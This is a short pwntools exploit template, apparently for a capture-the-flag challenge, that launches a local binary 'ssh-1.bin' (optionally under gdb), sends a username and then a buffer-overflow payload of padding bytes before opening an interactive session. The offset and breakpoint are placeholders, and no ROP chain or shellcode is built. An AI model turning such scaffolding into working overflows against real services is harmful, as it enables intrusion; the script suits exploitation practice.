#from pwnlib import process
from pwn import *

elf = ELF('ssh-1.bin')
rop = ROP(elf)

username = b''


if len(sys.argv) > 1 and sys.argv[1] == 'server':
    io = remote('127.0.0.1',1)
    #context.terminal = "urxvt"
elif len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    context(terminal=['tmux', 'split-window', '-v'])
    #context(terminal=['urxvt'])
    #context.terminal = 'urxvt'
    io = gdb.debug('./ssh-1.bin', '''
        # add a breakpoint
        break *0x12345678
        continue
        # Print stack
        x/64x $sp
        # Print registers
        info registers
        ''')
else:
    io = process('./ssh-1.bin')

print(io.recvregex(b':')) # read until we get the prompt
io.sendline(username)
print(io.recvregex(b':')) # read until we get the prompt)


def attack():
    offset = 12345

    padding = offset*b'a'

    payload = padding

    info("Sending payload: ", payload)

    io.sendline(payload)
    io.interactive()


attack()

